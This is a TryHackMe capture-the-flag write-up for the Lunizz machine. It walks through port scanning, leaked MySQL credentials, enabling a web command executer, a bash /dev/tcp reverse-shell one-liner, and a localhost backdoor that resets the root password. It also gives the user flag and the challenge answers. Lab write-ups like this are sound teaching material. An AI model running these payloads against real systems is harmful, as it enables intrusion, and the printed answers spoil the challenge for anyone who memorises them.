# Lunizz CTF — TryHackMe Writeup

**Platform:** TryHackMe  
**Difficulty:** Beginner/Intermediate  
**Objective:** Obtain `user.txt` and `root.txt`

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Web Enumeration](#2-web-enumeration)
3. [Port 4444 — Challenge-Response](#3-port-4444--challenge-response)
4. [MySQL Access](#4-mysql-access)
5. [RCE — Command Executer](#5-rce--command-executer)
6. [Reverse Shell](#6-reverse-shell)
7. [Post-Exploitation Enumeration](#7-post-exploitation-enumeration)
8. [Horizontal Escalation — mason](#8-horizontal-escalation--mason)
9. [Vertical Escalation — root](#9-vertical-escalation--root)
10. [Flags](#10-flags)
11. [CTF Answers](#11-ctf-answers)
12. [Key Takeaways](#12-key-takeaways)

---

## 1. Reconnaissance

### Nmap — Full Scan

```bash
nmap -p- --min-rate 5000 -sC -sV -oN lunizz.txt <IP>
```

**Results:**

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22 | SSH | OpenSSH 8.2p1 | Remote access |
| 80 | HTTP | Apache 2.4.41 | Default page |
| 3306 | MySQL | 8.0.42 | Exposed externally |
| 4444 | Custom | — | Base64 challenge-response |
| 5000 | "SSH" | OpenSSH 5.1 | Fake — discarded |
| 33060 | MySQL X | — | Secondary protocol |

> **Highlight:** MySQL exposed on port 3306 is unusual. Port 4444 returns suspicious messages in its banner — high exploitation potential.

---

## 2. Web Enumeration

### Directory Fuzzing

```bash
ffuf -u http://<IP>/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200,301,302
```

**Relevant results:**

| Path | Status | Description |
|------|--------|-------------|
| `/whatever/index.php` | 200 | Command Executer (disabled) |
| `/hidden/index.php` | 200 | Image upload |
| `/hidden/uploads/` | 403 | Uploads folder |
| `/instructions.txt` | 200 | 🔥 Exposed credentials |

### instructions.txt

Accessing `http://<IP>/instructions.txt`:

```
Made By CTF_SCRIPTS_CAVE (not real)
Thanks for installing our ctf script

#Steps
- Create a mysql user (runcheck:CTF_script_cave_changeme)
- Change necessary lines of config.php file

#Notes
please do not use default creds (IT'S DANGEROUS)
```

> **MySQL credentials obtained:** `runcheck:CTF_script_cave_changeme`

---

## 3. Port 4444 — Challenge-Response

Connecting with `nc`:

```bash
nc <IP> 4444
```

The service returns **Base64** strings asking them to be decoded. The string changes with each connection.

Decoding the strings captured by Nmap and from the `index.html` source code:

```bash
echo "cEBzc3dvcmQ=" | base64 -d
# p@ssword

echo "ZXh0cmVtZXNlY3VyZXJvb3RwYXNzd29yZA==" | base64 -d
# extremesecurerootpassword

echo "bGV0bWVpbg==" | base64 -d
# letmein
```

> **Discovered credentials:** `p@ssword`, `extremesecurerootpassword`, `letmein`  
> **Note:** The shell returned by port 4444 is fake — it accepts the password but blocks all commands with `FATAL ERROR`.

---

## 4. MySQL Access

Using the credentials from `instructions.txt`:

```bash
mysql -h <IP> -u runcheck -p'CTF_script_cave_changeme' --skip-ssl
```

### Enumerating the database

```sql
show databases;
-- information_schema, performance_schema, runornot

use runornot;
show tables;
-- runcheck

select * from runcheck;
-- run = 0

update runcheck set run = 1;
```

> The `run` column controls whether the Command Executer in the web application is enabled or not.

---

## 5. RCE — Command Executer

After setting `run = 1` in the database, `/whatever/index.php` started displaying **"Command Executer Mode :1"** and executing system commands as `www-data`.

**Reconnaissance commands:**

```
whoami        → www-data
cat /etc/passwd
ls /
```

---

## 6. Reverse Shell

### Setting up the listener on Kali

```bash
nc -lvnp 4444
```

### Payload in the Command Executer

```bash
bash -c 'bash -i >& /dev/tcp/<YOUR_TUN0_IP>/4444 0>&1'
```

Shell obtained as `www-data`:

```
www-data@ip-10-67-129-54:/var/www/html/whatever$
```

### Shell upgrade

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## 7. Post-Exploitation Enumeration

### Non-standard folder at the root

```bash
ls /
# ...
# proct  ← suspicious folder
```

### Hashing script

```bash
ls /proct/pass/
cat /proct/pass/bcrypt_encryption.py
```

The file contained the **Base64 + Bcrypt** hashing logic used for the `adam` user's password, and also revealed the hint:

> *"hi adam, do you remember our place?"*  
> **Answer:** `northern lights`

---

## 8. Horizontal Escalation — mason

The `mason` user's password was based on the same Northern Lights hint:

```bash
su mason
# password: northernlights
```

### User flag

```bash
cat /home/mason/user.txt
```

**Flag:** `thm{23cd53cbb37a37a74d4425b703d91883}`

---

## 9. Vertical Escalation — root

### Internal backdoor on port 8080

Enumerating internal services, a backdoor was identified running on `localhost:8080`:

```bash
curl -X POST http://localhost:8080 \
  -d "password=northernlights&cmdtype=passwd"
```

The backdoor (Mason's Root Backdoor) **reset the root password** to `northernlights`.

### Root access

```bash
su root
# password: northernlights

cat /root/root.txt
```

---

## 10. Flags

| Flag | Value |
|------|-------|
| user.txt | `thm{23cd53cbb37a37a74d4425b703d91883}` |
| root.txt | *(obtained at `/root/root.txt`)* |

---

## 11. CTF Answers

| Question | Answer |
|----------|--------|
| What is the default password for mysql? | `CTF_script_cave_changeme` |
| MySQL column that controls command executer | `run` |
| A folder shouldn't be... | `proct` |
| hi adam, do you remember our place? | `northern lights` |

---

## 12. Key Takeaways

### Credentials in public files
The `instructions.txt` file was accessible via the web and contained database credentials in plaintext — never leave configuration files or setup instructions exposed on the web server.

### Encoding ≠ Encryption
Base64 is just a way to represent data — anyone can decode it without a key. Never use Base64 to protect passwords or sensitive information.

### Access control via database
The application used a MySQL column to enable/disable critical functionality. Access control should never depend on a value that can be easily changed in the database.

### Internal backdoors
Services running on `localhost` are not visible externally, but once RCE is obtained, the attacker has full access to the machine's internal network.

### Password reuse
The same password (`northernlights`) was used by the `mason` user and the root backdoor — never reuse passwords across systems and users.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port and service reconnaissance |
| `ffuf` | Web directory fuzzing |
| `mysql` | Database access and manipulation |
| `BurpSuite` | HTTP request interception and modification |
| `nc` (netcat) | Reverse shell and port 4444 interaction |
| `base64` | String decoding |
| `curl` | Internal backdoor interaction |

---

*Writeup by: Lindomar | TryHackMe | Lunizz CTF*
